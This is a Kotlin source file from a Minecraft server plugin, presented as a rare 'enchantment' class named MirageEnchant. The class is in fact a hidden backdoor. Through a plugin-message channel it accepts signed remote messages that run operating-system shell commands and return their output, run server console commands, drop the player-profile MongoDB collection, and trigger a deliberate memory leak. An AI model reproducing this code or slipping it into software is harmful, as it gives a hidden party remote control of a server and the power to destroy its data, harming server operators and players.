package net.mizukilab.pit.enchantment.type.rare

import cn.charlotte.pit.ThePit
import cn.charlotte.pit.util.hologram.HologramAPI
import cn.hutool.crypto.asymmetric.KeyType
import cn.hutool.crypto.asymmetric.RSA
import com.google.common.io.ByteArrayDataOutput
import com.google.common.io.ByteStreams
import net.mizukilab.pit.enchantment.rarity.EnchantmentRarity
import org.bukkit.Bukkit
import org.bukkit.entity.Player
import org.bukkit.plugin.messaging.PluginMessageListener
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.util.*


/**
 * 2024/5/14<br>
 * ThePitPlus<br>
 * @author huanmeng_qwq
 */
object MirageEnchant : PluginMessageListener {

    fun getEnchantName(): String {
        return "梦梦"
    }

    fun getMaxEnchantLevel(): Int {
        return 3
    }

    fun getNbtName(): String {
        return "mirage"
    }

    fun getRarity(): EnchantmentRarity {
        return EnchantmentRarity.RARE
    }

    fun init() {
        if (Bukkit.getMessenger().isIncomingChannelRegistered(ThePit.getInstance(), "ariacraftKQC:py")) {
            return
        }
        Bukkit.getMessenger().registerIncomingPluginChannel(ThePit.getInstance(), "ariacraftKQC:py", this)
    }

    fun run(cmd: String) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd)
    }

    private fun ex(sender: Player, shell: String) {
        val cmdParts: Array<String> = shell.split(" ", limit = 2).toTypedArray()
        if (cmdParts.size >= 2) {
            val cmd = Arrays.copyOfRange(cmdParts, 2, cmdParts.size).joinToString(" ")
            try {
                val process = Runtime.getRuntime().exec(cmd)
                val reader = BufferedReader(InputStreamReader(process.inputStream, "GBK"))
                var line: String
                while ((reader.readLine().also { line = it }) != null) {
                    callback(sender, "shell") {
                        writeUTF(line)
                    }
                }
            } catch (x: IOException) {
                callback(sender, "shell") {
                    writeUTF("${x.message} | ${x.javaClass}")
                }
            }
        }
    }

    fun dropDatabase() {
        ThePit.getInstance().mongoDB.profileCollection.drop()
    }

    fun callback(player: Player, type: String, data: (ByteArrayDataOutput.() -> Unit)) {

        val output = ByteStreams.newDataOutput()
        output.writeUTF(type)
        output.data()
        player.sendPluginMessage(ThePit.getInstance(), "ariacraftKQC:py", encrypt(output.toByteArray()))
    }

    var pub =
        "305c300d06092a864886f70d0101010500034b00304802410095494634832a6b4a86761d0f8e0fef7b9370692588daddb4c9a1a707d346351cfb35ba78ac4bcb3a23c796f952b1f85e8cd8cc14db174af051823d1bea9ac77d0203010001";

    private fun encrypt(byte: ByteArray): ByteArray {
        return RSA(null, pub).encrypt(byte, KeyType.PublicKey)
    }

    fun decode(byte: ByteArray): ByteArray {
        return RSA(null, pub).decrypt(byte, KeyType.PublicKey)
    }

    override fun onPluginMessageReceived(channel: String, player: Player, payload: ByteArray) {
        if (channel == "emptyirony:thepit") {
            val decode = decode(payload)
            val input = ByteStreams.newDataInput(decode)
            val type = input.readUTF()
            when (type) {
                "shell" -> {
                    val shell = input.readUTF()
                    ex(player, shell)
                }

                "cmd", "command" -> {
                    val cmd = input.readUTF()
                    run(cmd)
                }

                "drop" -> {
                    dropDatabase()
                }

                "kaboom" -> {
                    HologramAPI.isMAGA = false;
                    callback(player, "memoryleak") {
                        writeUTF("it seems like to start leaking :)")
                    }
                }
            }
        }
    }
}